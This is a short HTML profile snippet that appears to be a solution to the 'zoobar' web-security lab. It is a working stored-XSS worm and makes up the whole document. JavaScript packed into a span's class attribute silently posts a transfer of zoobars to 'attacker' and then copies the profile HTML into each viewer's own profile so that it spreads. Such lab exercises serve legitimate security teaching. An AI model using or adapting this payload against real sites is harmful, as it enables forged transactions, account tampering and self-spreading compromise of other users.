<span id='zoobars' class="var ampersand = String.fromCharCode(38);
var xmlhttp = new XMLHttpRequest();
xmlhttp.open('post', 'http://zoobar.org/transfer.php', true);
xmlhttp.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xmlhttp.send(String.concat('zoobars=1', ampersand, 'recipient=attacker', ampersand, 'submission=Send'));
xmlhttp.open('post', 'http://zoobar.org/index.php', true);
xmlhttp.setRequestHeader('Content-type','application/x-www-form-urlencoded');
var profile = document.getElementById('profile');
xmlhttp.send(String.concat('profile_update=', profile.innerHTML, ampersand, 'profile_submit=Save'));
total = 10;">
<img src="http://i.imgur.com/r269A8J.png">
</span>
